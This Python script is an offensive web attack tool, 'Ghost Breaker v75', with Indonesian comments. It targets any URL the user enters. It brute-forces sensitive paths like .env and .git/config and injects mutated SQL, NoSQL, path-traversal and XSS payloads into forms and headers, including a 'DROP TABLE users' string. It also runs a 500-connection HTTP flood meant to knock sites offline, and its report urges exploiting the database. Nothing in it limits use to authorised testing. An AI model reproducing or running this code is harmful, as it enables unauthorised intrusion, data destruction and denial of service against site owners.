import asyncio, os, sys, socket, requests, urllib3, subprocess, platform, time, random, re, hashlib, base64, datetime, json
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("\033[1;31m[!] Modul 'bs4' belum terinstal. Jalankan: pip install beautifulsoup4\033[0m")
    sys.exit()

# Disable Warnings & Nonaktifkan Peringatan SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Palet Warna Global
RED, GREEN, YELLOW, BLUE, CYAN, WHITE, RESET, BOLD = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[1;36m", "\033[1;37m", "\033[0m", "\033[1m"
ORANGE = "\033[1;33m"

class GhostOmniSuite:
    def __init__(self):
        self.target, self.domain, self.target_ip = "", "", "Detecting..."
        self.session = requests.Session()
        self.timeout = 7 
        self.vuln_log = []  
        self.subdomains_found = []
        self.tech_stack = []
        self.firewall = "Not Detected / Unknown"
        self.server_loc = "Unknown"
        self.scan_queue = set()
        self.is_flooding = False
        self.request_count = 0
        self.start_time = None
        self.sem = asyncio.Semaphore(500) 
        self.executor = ThreadPoolExecutor(max_workers=150) 
        
        # File Logging
        self.log_sql = "Ghost_Breaker_Report.sql"
        self.log_txt = "Ghost_Breaker_Report.txt"

    def get_sys_info(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
        except: ip = "Disconnected/Terputus"
        model = subprocess.getoutput("getprop ro.product.model") if os.path.exists("/system/build.prop") else platform.node()
        batt = "N/A"
        if subprocess.call("command -v termux-battery-status", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
            try:
                batt_raw = subprocess.getoutput("termux-battery-status")
                batt = re.search(r'"percentage":\s*(\d+)', batt_raw).group(1) + "%"
            except: pass
        return ip, model, batt

    def write_logs(self, category, detail):
        """Mencatat temuan ke SQL dan TXT secara real-time"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.vuln_log.append([category, detail])
        
        # Log ke SQL (Format gabungan)
        with open(self.log_sql, "a") as f:
            clean_detail = detail.replace("'", "''")
            f.write(f"-- GHOST BREAKER REPORT | {timestamp}\n")
            f.write(f"INSERT INTO breaker_logs (target, tipe, detail, waktu) VALUES ('{self.domain}', '{category}', '{clean_detail}', '{timestamp}');\n")
        
        # Log ke TXT
        with open(self.log_txt, "a") as f:
            f.write(f"[{timestamp}] [{category.upper()}] -> {detail}\n")

    def mutate_payload(self, payload):
        """Advanced Mutate v75: Menambahkan Hex, Version Wrap, dan Unicode Bypass"""
        mutations = [
            lambda p: p, # Normal
            lambda p: p.replace(" ", "/**/"), 
            lambda p: "".join(f"%{ord(c):02x}" for c in p), 
            lambda p: "".join(f"%%{ord(c):02x}" for c in p), 
            lambda p: base64.b64encode(p.encode()).decode(), 
            lambda p: p.replace("'", "%27").replace(" ", "+"), 
            lambda p: f"/*!50000{p}*/", # MySQL Version Wrap
            lambda p: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
            lambda p: p.replace("OR", "||").replace("AND", "&&"),
            lambda p: f"admin'-- " if "1=1" in p else p 
        ]
        return random.choice(mutations)(payload)

    def calculate_risk(self):
        if not self.vuln_log: return 0
        points = 0
        weights = {
            "CRITICAL_VULN": 45, "SQLI": 40, "CRITICAL_BLIND_SQLI": 45, "BLIND_SQLI": 45,
            "SQL_TIME_BASED": 48, "SQL_BOOLEAN": 42, "NOSQL_INJECT": 40, "AUTH_BYPASS": 50, 
            "LFI": 35, "DIREKTORI_SENSITIF": 20, "DIRECTORY": 15, "SUBDOMAIN": 10, "XSS": 25, "INFO": 5
        }
        for v in self.vuln_log:
            cat = v[0].upper()
            points += weights.get(cat, 15)
        return min(points, 100)

    def banner(self, mode="Main Menu"):
        os.system("clear" if os.name == "posix" else "cls")
        ip_addr, model_dev, battery = self.get_sys_info()
        risk = self.calculate_risk()
        risk_color = RED if risk > 70 else ORANGE if risk > 40 else GREEN
        
        print(f"{RED}{BOLD}           uuuuuuu             ")
        print(f"       uu$$$$$$$$$$$uu         ")
        print(f"    uu$$$$$$$$$$$$$$$$$u      ")
        print(f"   u$$$$$$$$$$$$$$$$$$$$u                  {CYAN}GHOST BREAKER v75-MAX{RED}")
        print(f"   u$$$$$$$$$$$$$$$$$$$$$$      {GREEN}───────────────────────────────────{RED}")
        print(f"  u$$$$$$$$$$$$$$$$$$$$$$$u     {BLUE}Tool Name : {RED}Ghost-Web-Scanner-V1.0{RED}")
        print(f"  u$$$$$$$$$$$$$$$$$$$$$$$u     {BLUE}Power     : {GREEN}{mode}{RED}")
        print(f"  u$$$$$$\"   \"$$$\"   \"$$$$$u    {BLUE}Author    : {RED}Sneijderlino{RED}")
        print(f"  \"$$$$\"      u$u       \"$$$    {YELLOW}[github.com/Sneijderlino]{RED}")
        print(f"   $$$u       u$u       u$$$    {GREEN}───────────────────────────────────{RED}")
        print(f"   $$$u      u$$$u      u$$$    {BLUE}RISK LVL  : {risk_color}{risk}% JEBROL{RED}")
        print(f"    \"$$$$uu$$$   $$$uu$$$$\"     {BLUE}OS        : {GREEN}{model_dev[:12]}{RED} ({battery})")
        print(f"     \"$$$$$$$\"   \"$$$$$$$\"      {BLUE}TARGET    : {ORANGE}{self.domain if self.domain else 'Ready'}{RED}")
        print(f"       u$$$$$$$u$$$$$$$$u        {BLUE}IP TGT    : {YELLOW}{self.target_ip}{RED}")
        print(f"        u$\"$\"$\"$\"$\"$\"$\"u        ")
        print(f"         $$u$u$u$u$u$$         ")
        print(f"          $$$$$$$$$$$          ")
        print(f"           \"$$$$$$$\"           ")
        print(f"{BLUE}[ {ORANGE}KALI LINUX {WHITE}| {BLUE}TERMUX {WHITE}| {CYAN}GOD MODE v75 ACTIVE {BLUE}]{RESET}")
        print(f"{GREEN}════════════════════════════════════════════════════════{RESET}")

    async def fetch(self, url, params=None, method="GET", timeout=None, json_data=None, headers=None):
        async with self.sem:
            try:
                t = timeout or self.timeout
                loop = asyncio.get_running_loop()
                h = {
                    "User-Agent": f"Ghost-v75/{random.random()}", 
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.1",
                    "Content-Type": "application/json" if json_data else "application/x-www-form-urlencoded"
                }
                if headers: h.update(headers)
                self.request_count += 1
                
                def do_req():
                    if method == "POST":
                        return self.session.post(url, data=params, json=json_data, timeout=t, verify=False, headers=h)
                    if method == "PUT":
                        return self.session.put(url, data=params, timeout=t, verify=False, headers=h)
                    return self.session.get(url, params=params, timeout=t, verify=False, headers=h)

                return await loop.run_in_executor(self.executor, do_req)
            except: return None

    async def sync_bar(self, duration, label, task):
        steps = 20
        for i in range(steps + 1):
            if task.done(): break
            percent = (i / steps) * 100
            bar = f"{CYAN}█{RESET}" * i + f"{WHITE}-{RESET}" * (steps - i)
            sys.stdout.write(f"\r    {WHITE}[{label}] [{percent:3.0f}%] [{bar}] {RESET}")
            sys.stdout.flush()
            await asyncio.sleep(duration / steps)
        res = await task
        sys.stdout.write(f"\r    {WHITE}[{label}] [100%] [{GREEN}{'█' * steps}{RESET}] {RESET}\n")
        return res

    async def get_target_intel(self):
        try:
            loc_req = requests.get(f"http://ip-api.com/json/{self.target_ip}", timeout=5).json()
            if loc_req.get('status') == 'success':
                self.server_loc = f"{loc_req.get('city')}, {loc_req.get('country')} ({loc_req.get('as')})"
            
            r = await self.fetch(self.target)
            if r:
                h_str = str(r.headers).lower()
                if "cloudflare" in h_str: self.firewall = "Cloudflare WAF"
                elif "mod_security" in h_str: self.firewall = "ModSecurity"
                elif "sucuri" in h_str: self.firewall = "Sucuri CloudProxy"
                
                if "wp-content" in r.text: self.tech_stack.append("WordPress CMS")
                if "PHPSESSID" in h_str: self.tech_stack.append("PHP Backend")
                server = r.headers.get("Server", "Unknown")
                self.tech_stack.append(server)
        except: pass

    async def run_v47(self):
        self.banner("V47 - RECON FORCE & BRUTE")
        self.start_time = datetime.datetime.now()
        await self.get_target_intel()
        print(f"{YELLOW}[*] Membongkar Direktori & Subdomain...{RESET}")
        
        subs = ["www", "dev", "admin", "api", "staging", "test", "mail", "db", "portal"]
        for s in subs:
            sub_url = f"{s}.{self.domain}"
            task = asyncio.create_task(self.fetch(f"http://{sub_url}"))
            res = await self.sync_bar(0.01, f"Sub: {s}", task)
            if res: self.write_logs("SUBDOMAIN", sub_url)

        brute_list = ["admin", "config", ".env", ".git/config", "backup", "db_backup.sql", "v1/api", "api/v1/user", "server-status", ".htaccess", "web.config", "login.php", "wp-admin"]
        for b in brute_list:
            url = f"{self.target.rstrip('/')}/{b}"
            task = asyncio.create_task(self.fetch(url, method="GET"))
            r = await self.sync_bar(0.01, f"Force: /{b}", task)
            if r and r.status_code in [200, 403, 405]:
                cat = "DIREKTORI_SENSITIF" if r.status_code == 200 else "DIRECTORY"
                self.write_logs(cat, f"{url} (Status: {r.status_code})")

    async def run_v51(self):
        self.banner("V51 - SQL GOD-MODE")
        print(f"{YELLOW}[*] Menembus Celah Parameter dengan Heuristic Detection...{RESET}")
        
        base_res = await self.fetch(self.target)
        if not base_res: return
        
        soup = BeautifulSoup(base_res.text, "html.parser")
        forms = soup.find_all("form")
        
        # Enhanced Payload List
        sql_payloads = [
            "' OR 1=1--", "\" OR \"1\"=\"1\" #", "') OR ('1'='1'--", 
            "' UNION SELECT NULL,NULL,CONCAT(0x71,VERSION(),0x71)--",
            "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", # Time Based
            '{"$gt": ""}', # NoSQL Inhibit
            "admin'--", "../../../../etc/passwd", "<svg/onload=alert(1)>"
        ]

        for form in forms:
            action = urljoin(self.target, form.get("action", ""))
            method = form.get("method", "GET").upper()
            inputs = form.find_all(["input", "textarea"])
            
            for inp in inputs:
                nama = inp.get("name")
                if not nama: continue
                
                for p in sql_payloads:
                    p_mutated = self.mutate_payload(p)
                    print(f"    {CYAN}[AUDIT] Testing '{nama}' -> {p_mutated[:20]}...{RESET}")
                    
                    start_time = time.time()
                    t1 = asyncio.create_task(self.fetch(action, params={nama: p_mutated}, method=method))
                    t2 = asyncio.create_task(self.fetch(action, json_data={nama: {"$ne": None}}, method="POST"))
                    
                    results = await asyncio.gather(t1, t2)
                    elapsed = time.time() - start_time

                    for res in results:
                        if res:
                            errors = ["sql syntax", "mysql_fetch", "native client", "unclosed quotation mark", "postgresql query", "mongodb"]
                            if any(err in res.text.lower() for err in errors):
                                cat = "SQLI" if "sql" in res.text.lower() else "NOSQL_INJECT"
                                self.write_logs(cat, f"URL: {action} | Param: {nama} | Payload: {p_mutated}")
                                print(f"{RED}[!!!] CRITICAL FOUND: {cat}{RESET}")

                            if elapsed > 4 and ("sleep" in p.lower() or "waitfor" in p.lower()):
                                self.write_logs("SQL_TIME_BASED", f"URL: {action} | Param: {nama} (Delay: {elapsed:.2f}s)")
                                print(f"{RED}[!!!] TIME-BASED SQLi DETECTED!{RESET}")

                            if len(res.text) != len(base_res.text) and "1=1" in p:
                                if res.status_code == 200:
                                    self.write_logs("SQL_BOOLEAN", f"URL: {action} | Param: {nama}")
                                    print(f"{YELLOW}[!] Possible Boolean SQLi found.{RESET}")

    async def run_v55(self):
        self.banner("V55 - HEADER GOD-FORCE")
        print(f"{YELLOW}[*] Membongkar Jalur Internal & Header Tampering...{RESET}")
        discovered_links = set()
        try:
            r = await self.fetch(self.target)
            if r:
                soup = BeautifulSoup(r.text, "html.parser")
                for a in soup.find_all('a', href=True):
                    link = urljoin(self.target, a['href'])
                    if self.domain in link: discovered_links.add(link)
                
                print(f"{GREEN}[+] Found {len(discovered_links)} Internal Pages.{RESET}")
                for link in list(discovered_links)[:10]:
                    print(f"    {CYAN}» Auditing Page: {link}{RESET}")
                    # Header Injection Pro
                    h_test = {
                        "User-Agent": self.mutate_payload("' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"), 
                        "X-Forwarded-For": "127.0.0.1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
                        "Referer": "'; DROP TABLE users--"
                    }
                    start = time.time()
                    await self.fetch(link, headers=h_test, timeout=12)
                    elapsed = time.time() - start
                    if elapsed >= 5:
                        self.write_logs("BLIND_SQLI_HEADER", f"Time-Based Vulnerable: {link} (Delay: {elapsed:.2f}s)")
                        print(f"{RED}[!!!] HEADER VULNERABILITY DETECTED!{RESET}")
        except: pass

    async def run_v60(self):
        self.banner("V60 - OMNI-VOID (PACKET STORM)")
        self.is_flooding = True
        try:
            intensity = int(input(f"{CYAN}Intensity (Threads 100-500): {WHITE}"))
        except: intensity = 500
        print(f"{RED}[!!!] VOID PROTOCOL ACTIVE (500 SEMAPHORE). CTRL+C TO STOP.{RESET}")
        try:
            await asyncio.gather(*(self.void_flood() for _ in range(intensity)))
        except KeyboardInterrupt:
            self.is_flooding = False

    async def void_flood(self):
        junk = {"void": "GHOST" * 1024, "attack": "TRUE", "cmd": "DESTROY"}
        while self.is_flooding:
            try:
                await self.fetch(self.target, method="POST", params=junk, timeout=5)
                if self.request_count % 500 == 0:
                    sys.stdout.write(f"\r{RED}[!!!] TOTAL PACKETS DISPATCHED: {self.request_count}{RESET}")
                    sys.stdout.flush()
            except: pass

    def show_results(self):
        self.banner("FINAL REPORT & VULN ANALYSIS")
        risk = self.calculate_risk()
        end_time = datetime.datetime.now()
        duration = end_time - self.start_time if self.start_time else "N/A"
        
        print(f"{YELLOW}╔══════════════════════════════════════════════════════════╗{RESET}")
        print(f" {CYAN}TARGET INTELLIGENCE SUMMARY (GOD MODE v75){RESET}")
        print(f" {WHITE}URL       : {self.target}")
        print(f" {WHITE}IP & LOC  : {self.target_ip} | {self.server_loc}")
        print(f" {WHITE}FIREWALL  : {RED if 'Detected' in self.firewall or 'Tidak' in self.firewall else GREEN}{self.firewall}{RESET}")
        print(f" {WHITE}TECH STACK: {', '.join(self.tech_stack) if self.tech_stack else 'Unknown'}")
        print(f"{YELLOW}╠══════════════════════════════════════════════════════════╣{RESET}")
        
        status_text = f"{RED}CRITICAL RISK / JEBROL" if risk > 70 else f"{ORANGE}MEDIUM RISK" if risk > 30 else f"{GREEN}LOW RISK"
        print(f" {CYAN}SECURITY STATUS: {RED if risk > 50 else GREEN}{risk}% Rentan ({status_text}){RESET}")
        print(f" {WHITE}Total Requests: {self.request_count} | Duration: {str(duration).split('.')[0]}")
        print(f"{YELLOW}╠══════════════════════════════════════════════════════════╣{RESET}")

        print(f" {CYAN}VULNERABILITY BREAKDOWN:{RESET}")
        if not self.vuln_log:
            print(f"  {GREEN}» [SAFE/KUAT] Tidak ada parameter kritis ditemukan.{RESET}")
        else:
            found_types = {}
            for cat, detail in self.vuln_log:
                if cat not in found_types: found_types[cat] = []
                found_types[cat].append(detail)

            for cat, details in found_types.items():
                color = RED if cat in ["SQLI", "LFI", "SQL_TIME_BASED", "NOSQL_INJECT", "AUTH_BYPASS", "BLIND_SQLI_HEADER"] else YELLOW
                count = len(details)
                print(f"\n  {color}[!] {cat} ({count} Point Found){RESET}")
                for d in details[:3]:
                    print(f"      {WHITE}└─ {d}{RESET}")
                if count > 3: print(f"      {WHITE}└─ ... dan {count-3} temuan lainnya.")

        print(f"\n{YELLOW}╠══════════════════════════════════════════════════════════╣{RESET}")
        print(f" {CYAN}GHOST RECOMMENDATION:{RESET}")
        if risk > 50:
            print(f"  {RED}» PERTAHANAN TERBONGKAR. Eksploitasi database segera.{RESET}")
        else:
            print(f"  {GREEN}» Pertahanan cukup solid. Coba perpanjang durasi V60.{RESET}")
        print(f"{YELLOW}╚══════════════════════════════════════════════════════════╝{RESET}")
        
        print(f"\n{BLUE}[i] Log v75 tersimpan di: {self.log_sql} & {self.log_txt}{RESET}")

    async def main_menu(self):
        while True:
            self.banner()
            if not self.target:
                self.target = input(f"{CYAN}Input Target URL: {WHITE}").strip()
                if not self.target: continue
                if not self.target.startswith("http"): self.target = "http://" + self.target
                self.domain = urlparse(self.target).netloc
                try: self.target_ip = socket.gethostbyname(self.domain)
                except: self.target_ip = "Error"
                continue

            print(f"{WHITE}[ 1 ] V47 - Recon Force (v75 Agressive)")
            print(f"[ 2 ] V51 - SQL GOD-MODE (Abyss Injeksi)")
            print(f"[ 3 ] V55 - Header God-Force (Blind SQLi)")
            print(f"[ 4 ] {ORANGE}V60 - Omni-Void (500 Conn Packet Storm){WHITE}")
            print(f"[ 5 ] {GREEN}LIHAT HASIL (Report v75 Analysis){WHITE}")
            print(f"[ 0 ] Exit{RESET}")
            
            cmd = input(f"\n{YELLOW}Ghost@Sneijderlino:~# {WHITE}")
            if cmd == "1": await self.run_v47()
            elif cmd == "2": await self.run_v51()
            elif cmd == "3": await self.run_v55()
            elif cmd == "4": await self.run_v60()
            elif cmd == "5": self.show_results()
            elif cmd == "0": break
            input(f"\n{GREEN}Tekan Enter untuk kembali...{RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(GhostOmniSuite().main_menu())
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Terputus oleh User / Sesi Dihentikan.{RESET}")
